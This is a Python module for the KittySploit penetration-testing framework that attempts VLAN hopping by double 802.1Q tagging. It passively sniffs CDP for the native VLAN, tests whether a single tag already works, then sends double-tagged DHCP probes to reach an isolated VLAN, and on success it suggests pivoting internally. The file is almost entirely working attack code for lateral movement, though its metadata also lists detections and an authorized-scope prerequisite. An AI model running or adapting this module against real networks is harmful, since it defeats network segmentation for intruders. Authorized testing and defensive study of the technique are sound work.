#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Attempt VLAN hopping via double 802.1Q tagging from an access port."""

from __future__ import annotations

import json
from typing import List

from kittysploit import *
from lib.protocols.vlan.vlan_client import CdpHint, Vlan_client


class Module(Auxiliary, Vlan_client):
    __info__ = {
        "name": "VLAN Double Tag Hop",
        "description": (
            "Attempt to reach a target VLAN from an access port by sending double-tagged "
            "802.1Q frames (outer native VLAN + inner target VLAN). Useful when a switch "
            "forwards one untagged/native VLAN but does not filter nested tags."
        ),
        "author": ["KittySploit Team"],
        "tags": ["vlan", "802.1q", "dot1q", "hop", "double-tag", "lateral", "network"],
        "references": [
            "https://attack.mitre.org/techniques/T1599/",
            "IEEE 802.1Q",
        ],
        "attack": {
            "tactics": ["TA0011", "Command and Control"],
            "techniques": ["T1599"],
            "prerequisites": [
                "Layer-2 access port on a vulnerable or misconfigured switch",
                "Knowledge or guess of native VLAN and target VLAN",
                "Ethernet interface with raw frame injection (CAP_NET_RAW / root)",
                "Authorized assessment scope",
            ],
            "detections": [
                "Double-tagged frames on access ports",
                "Unexpected DHCP/ARP activity on isolated VLANs",
            ],
            "artifacts": [
                "Switch security syslog / VLAN hopping alerts",
                "DHCP server logs on target VLAN",
            ],
        },
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "lateral_movement"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "tech_hints", "evidence"],
            "cost": 2.0,
            "noise": 0.9,
            "value": 1.5,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": [],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": ["vlan_segment"],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [{"capability": "vlan_access", "from_detail": "target_vlan"}],
                "consumes_capabilities": [{"capability": "vlan_segment", "from_detail": "vlan_id"}],
                "option_bindings": {"target_vlan": "TARGET_VLAN", "native_vlan": "NATIVE_VLAN"},
                "suggested_followups": [],
            },
        },
    }

    target_vlan = OptInteger(0, "Target VLAN ID to reach", required=True)
    auto_native_vlan = OptBool(
        True,
        "Passively sniff CDP before hopping to refine native VLAN",
        required=False,
    )
    verify_single_tag = OptBool(
        True,
        "First verify that a single tag on the target VLAN does not already work",
        required=False,
    )
    output_file = OptString("", "Optional JSON output path", required=False)

    def check(self):
        if not self.vlan_require_scapy():
            print_error("scapy is not installed. Install it with: pip install scapy")
            return False

        target = self._target_vlan()
        if target < 1 or target > 4094:
            print_error("TARGET_VLAN must be between 1 and 4094")
            return False

        native = self._native_vlan()
        if native < 1 or native > 4094:
            print_error("NATIVE_VLAN must be between 1 and 4094")
            return False

        if not self._iface():
            print_error("Interface is required")
            return False
        return True

    def run(self):
        iface = self._iface() or "eth0"
        target_vlan = self._target_vlan()
        native_vlan = self._native_vlan()
        timeout = self._timeout()

        print_info(f"VLAN double-tag hop on {iface}")
        print_info(f"Target VLAN: {target_vlan}")
        print_info("=" * 72)

        try:
            client_mac = self.vlan_interface_mac(iface)
        except Exception as exc:
            print_error(str(exc))
            return False

        print_info(f"Source MAC: {client_mac}")

        cdp_hints: List[CdpHint] = []
        if bool(self.auto_native_vlan):
            cdp_timeout = self._cdp_timeout()
            print_status(f"Listening {cdp_timeout:.1f}s for CDP native VLAN hints...")
            try:
                cdp_hints = self.vlan_sniff_cdp(iface=iface, timeout=cdp_timeout)
            except PermissionError:
                print_error(f"Permission denied on {iface} — run as root or grant CAP_NET_RAW")
                return False
            except OSError as exc:
                print_error(f"CDP capture failed on {iface}: {exc}")
                return False

            for hint in cdp_hints:
                parts = [hint.source_mac]
                if hint.device_id:
                    parts.append(hint.device_id)
                if hint.native_vlan is not None:
                    parts.append(f"native_vlan={hint.native_vlan}")
                print_success("CDP: " + " | ".join(parts))

            native_vlan = self.vlan_pick_native_from_cdp(cdp_hints, native_vlan)
            print_info(f"Using native VLAN tag: {native_vlan}")

        result_payload = {
            "interface": iface,
            "target_vlan": target_vlan,
            "native_vlan": native_vlan,
            "cdp_hints": self.vlan_cdp_to_dict(cdp_hints),
            "single_tag_worked": False,
            "double_tag_worked": False,
            "detail": "",
            "source": "",
        }

        if bool(self.verify_single_tag):
            print_status(f"Checking whether VLAN {target_vlan} is directly reachable with one tag...")
            try:
                single_hit = self.vlan_probe_dhcp(
                    target_vlan,
                    iface=iface,
                    client_mac=client_mac,
                    timeout=timeout,
                )
            except PermissionError:
                print_error(f"Permission denied on {iface} — run as root or grant CAP_NET_RAW")
                return False
            except OSError as exc:
                print_error(f"Single-tag probe failed on {iface}: {exc}")
                return False

            if single_hit:
                result_payload["single_tag_worked"] = True
                result_payload["detail"] = single_hit.detail
                result_payload["source"] = single_hit.source
                print_success(
                    f"VLAN {target_vlan} already reachable with a single tag "
                    f"({single_hit.detail}) — double tagging not required"
                )
                self._maybe_save(result_payload)
                return True

            print_info("Single-tag probe failed — trying double-tag hop")

        print_status(
            f"Sending double-tagged DHCP probe: outer VLAN {native_vlan}, inner VLAN {target_vlan}"
        )
        try:
            hop_hit = self.vlan_probe_double_tag(
                target_vlan,
                native_vlan=native_vlan,
                iface=iface,
                client_mac=client_mac,
                timeout=timeout,
            )
        except PermissionError:
            print_error(f"Permission denied on {iface} — run as root or grant CAP_NET_RAW")
            return False
        except OSError as exc:
            print_error(f"Double-tag probe failed on {iface}: {exc}")
            return False

        if hop_hit:
            result_payload["double_tag_worked"] = True
            result_payload["detail"] = hop_hit.detail
            result_payload["source"] = hop_hit.source
            print_success(
                f"Double-tag hop succeeded into VLAN {target_vlan} "
                f"({hop_hit.detail})"
            )
            if hop_hit.source:
                print_info(f"Responder: {hop_hit.source}")
            print_info(
                "Next steps: send tagged traffic with native+target tags, "
                "or configure a subinterface and pivot internally"
            )
            self._maybe_save(result_payload)
            return True

        print_warning(
            f"Double-tag hop into VLAN {target_vlan} failed "
            f"(native VLAN {native_vlan})"
        )
        print_info(
            "Try another NATIVE_VLAN, disable AUTO_NATIVE_VLAN, or confirm the switch blocks nested tags"
        )
        self._maybe_save(result_payload)
        return False

    def _maybe_save(self, payload: dict) -> None:
        output_file = str(self.output_file or "").strip()
        if not output_file:
            return
        try:
            with open(output_file, "w", encoding="utf-8") as handle:
                json.dump(payload, handle, indent=2)
            print_success(f"Results saved to {output_file}")
        except OSError as exc:
            print_warning(f"Could not write output file: {exc}")
